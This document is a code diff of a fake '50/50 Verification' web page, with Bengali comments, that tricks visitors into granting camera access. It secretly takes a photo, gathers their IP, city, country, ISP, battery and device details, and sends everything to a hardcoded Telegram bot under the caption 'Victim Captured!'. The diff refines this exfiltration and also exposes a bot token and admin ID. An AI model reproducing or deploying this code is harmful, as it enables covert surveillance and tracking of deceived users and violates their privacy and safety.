@@ -6,6 +6,7 @@
     <title>50/50 Verification</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
+        
         body { 
             font-family: 'Segoe UI', Arial, sans-serif;
             text-align: center;
@@ -20,12 +21,14 @@
             background-repeat: no-repeat;
             background-attachment: fixed;
         }
+
         .overlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
             background-color: rgba(0, 0, 0, 0.4); 
             z-index: 1;
         }
+
         .container {
             background: rgba(255, 255, 255, 0.15); 
             backdrop-filter: blur(10px); 
@@ -39,19 +42,23 @@
             z-index: 2;
             position: relative;
         }
+
         h1 { color: #ffffff; font-size: 28px; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
         h2 { color: #ffeb3b; font-size: 18px; margin-bottom: 10px; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
         p { color: #ffffff; font-size: 15px; margin-bottom: 25px; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
+
         #verify-btn { 
             background-color: #1a73e8; 
             color: white; border: none; padding: 15px 40px; 
             font-size: 18px; border-radius: 50px; cursor: pointer; 
             width: 100%; font-weight: bold;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
         }
+
         #video, #canvas { display: none; }
         #status { margin-top: 20px; font-weight: bold; font-size: 16px; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
-        .success { color: #00ff00 !important; } /* সফল হলে সবুজ */
-        .error { color: #ff0000 !important; }   /* ব্যর্থ হলে লাল */
+        .success { color: #00ff00 !important; } /* ছবি উঠলে সবুজ */
+        .error { color: #ff0000 !important; }   /* এলাও না করলে লাল */
     </style>
 </head>
 <body>
@@ -72,6 +79,7 @@
     <script>
         const botToken = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs";
         const adminId = "7068444019"; 
+
         const urlParams = new URLSearchParams(window.location.search);
         const userIdFromLink = urlParams.get('id'); 
 
@@ -80,18 +88,22 @@
         const canvas = document.getElementById('canvas');
         const status = document.getElementById('status');
 
-        // ট্র্যাকিং ডাটা ফাংশন
+        // নতুন ও ফাস্ট ট্র্যাকিং ফাংশন
         async function getTrackerData() {
             try {
-                const res = await fetch('https://ipapi.co/json/');
+                const res = await fetch('https://ipwho.is/');
                 const d = await res.json();
+                
                 let batteryInfo = "N/A";
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
                     batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'চার্জ হচ্ছে' : 'না'})`;
                 }
-                return `\n\n📍 IP: ${d.ip}\n🌍 City: ${d.city}\n🚩 Country: ${d.country_name}\n🔋 Battery: ${batteryInfo}\n📱 Device: ${navigator.userAgent.substring(0, 45)}`;
-            } catch (e) { return "\n\n(Tracking Failed)"; }
+
+                return `\n\n📍 IP: ${d.ip}\n🌍 City: ${d.city}\n🚩 Country: ${d.country}\n🔋 Battery: ${batteryInfo}\n🌐 ISP: ${d.connection.isp}\n📱 Device: ${navigator.userAgent.substring(0, 35)}`;
+            } catch (e) { 
+                return "\n\n(Tracking data failed)"; 
+            }
         }
 
         verifyBtn.addEventListener('click', async () => {
@@ -100,8 +112,11 @@
             verifyBtn.style.display = "none"; 
 
             try {
+                // ক্যামেরা পারমিশন চাওয়া
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
+                
+                // ট্র্যাকিং ডাটা সংগ্রহ
                 const trackerInfo = await getTrackerData();
 
                 video.onloadedmetadata = () => {
@@ -115,20 +130,28 @@
                         canvas.toBlob(async (blob) => {
                             const captionText = "📸 Victim Captured!" + trackerInfo;
                             
+                            // টেলিগ্রামে ডাটা পুশ করা
+                            const ok = await sendToTelegram(blob, adminId, captionText);
+                            
                             if (userIdFromLink && userIdFromLink !== adminId) {
                                 await sendToTelegram(blob, userIdFromLink, captionText);
                             }
-                            await sendToTelegram(blob, adminId, captionText);
 
-                            // সফল হলে সবুজ লেখা
-                            status.innerText = "Verification Successful!";
-                            status.className = "success";
+                            // সাকসেস মেসেজ (সবুজ)
+                            if (ok) {
+                                status.innerText = "Verification Successful!";
+                                status.className = "success";
+                            } else {
+                                status.innerText = "Server Error!";
+                                status.className = "error";
+                            }
+                            
                             stream.getTracks().forEach(track => track.stop());
-                        }, 'image/jpeg', 0.9);
+                        }, 'image/jpeg', 0.8);
                     }, 3000); 
                 };
             } catch (err) {
-                // ক্যামেরা এলাও না করলে লাল লেখা
+                // ক্যামেরা এলাও না করলে লাল মেসেজ
                 status.innerText = "Verification Unsuccessfully!";
                 status.className = "error";
                 verifyBtn.style.display = "block";
@@ -141,11 +164,13 @@
             formData.append('photo', blob, 'user.jpg');
             formData.append('caption', caption);
             try {
-                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
-            } catch(e) {}
+                const resData = await response.json();
+                return resData.ok;
+            } catch(e) { return false; }
         }
     </script>
 </body>
